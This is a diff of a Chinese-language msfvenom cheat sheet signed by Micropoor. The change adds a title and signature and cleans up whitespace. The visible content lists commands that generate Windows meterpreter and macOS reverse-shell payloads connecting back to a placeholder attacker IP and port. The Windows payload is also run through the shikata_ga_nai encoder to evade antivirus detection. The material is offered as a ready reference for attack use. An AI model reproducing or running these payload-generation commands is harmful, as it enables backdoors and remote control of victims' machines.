@@ -1,13 +1,14 @@
+# msfvenom 常用生成 Payload 命令
 
 ### windows:
 ```bash
-msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp 
+msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp
 LHOST=攻击机IP LPORT=攻击机端口 -e x86/shikata_ga_nai -b '\x00\x0a\xff' -i 3 -f exe -o payload.exe
 ```
 ### mac:
 ```bash
 msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f macho -o payload.macho
-``` 
+```
 
 ### android:
 ```bash
@@ -132,4 +133,6 @@ Options:
 --smallest Generate the smallest possible payload
 -h, --help 显示帮助文件
 ```
->   Micropoor
+
+
+<p align="right">--By  Micropoor </p>
